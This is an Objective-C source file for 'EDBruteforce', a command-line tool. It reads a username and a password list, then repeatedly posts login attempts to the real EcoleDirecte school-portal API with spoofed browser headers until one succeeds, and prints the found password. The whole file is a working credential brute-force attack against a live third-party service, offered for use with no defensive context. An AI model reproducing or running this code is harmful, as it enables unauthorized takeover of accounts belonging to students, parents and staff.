//
//  main.m
//  EDBruteforce
//
//  Created by LIVEN on 12/11/2020.
//  Copyright © 2020 LIVEN. All rights reserved.
//

#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        bool canContinue = NO;
        NSArray *passwordsArray;
        bool realPasswordFound = NO;
        NSString *realPassword;
        
        NSLog(@"Welcome to EDBruteforce");
        char str[50] = {0};
        printf("What account do you want to bruteforce in? ");
        scanf("%s", str);
        NSString *username = [NSString stringWithUTF8String:str];
        
        printf("Drag here your password list file (.txt) ");
        scanf("%s", str);
        NSString *path = [NSString stringWithUTF8String:str];
        if([[NSFileManager defaultManager] fileExistsAtPath:path]) {
            NSData *data = [[NSFileManager defaultManager] contentsAtPath:path];
            
            NSString *passwordList = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            
            passwordsArray = [passwordList componentsSeparatedByString:@":"];
            NSLog(@"Got file, beginning checking now for user %@..", username);
            canContinue = YES;
        } else {
           NSLog(@"File does not exist.");
        }
        
        if(canContinue) {
            for(NSString* password in passwordsArray) {
                NSError __block *err = NULL;
                NSData __block *data;
                BOOL __block reqProcessed = false;
                NSURLResponse __block *resp;
                NSDictionary __block *responseDict;
                
                NSString *bodyData = [NSString stringWithFormat:@"data={\n    \"identifiant\": \"%@\",\n    \"motdepasse\": \"%@\"\n}", username, password];
                NSMutableURLRequest *postRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://api.ecoledirecte.com/v3/login.awp"]];
                [postRequest setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
                [postRequest setValue:@"https://www.ecoledirecte.com" forHTTPHeaderField:@"Origin"];
                [postRequest setValue:@"same-site" forHTTPHeaderField:@"Sec-Fetch-Site"];
                [postRequest setValue:@"cors" forHTTPHeaderField:@"Sec-Fetch-Mode"];
                [postRequest setValue:@"empty" forHTTPHeaderField:@"Sec-Fetch-Dest"];
                [postRequest setValue:@"gzip, deflate, br" forHTTPHeaderField:@"Accept-Encoding"];
                [postRequest setValue:@"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" forHTTPHeaderField:@"Accept-Language"];
                //missing accept; useragent; keep-alive; referer
                [postRequest setHTTPMethod:@"POST"];
                [postRequest setHTTPBody:[NSData dataWithBytes:[bodyData UTF8String] length:strlen([bodyData UTF8String])]];

                [[[NSURLSession sharedSession] dataTaskWithRequest:postRequest completionHandler:^(NSData * _Nullable _data, NSURLResponse * _Nullable _response, NSError * _Nullable _error) {
                    resp = _response;
                    err = _error;
                    data = _data;
                    reqProcessed = true;
                            
                    responseDict = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingAllowFragments error:nil];
                }] resume];

                while (!reqProcessed) {
                    [NSThread sleepForTimeInterval:0.02];
                }
                NSString *code = responseDict[@"code"];
                NSString *codeFixed = [NSString stringWithFormat:@"%@", code];
                if(![codeFixed isEqual:@"200"]) {
                    NSLog(@"Error %@ for %@", codeFixed, password);
                }
                else {
                    realPasswordFound = YES;
                    realPassword = password;
                    break;
                }
            }
        }
        if(realPasswordFound) {
            NSLog(@"\nFOUND PASSWORD: %@", realPassword);
        }
        else {
            NSLog(@"\nChecking ended, no valid password found.");
        }
        scanf("%s", str);
    }
    return 0;
}
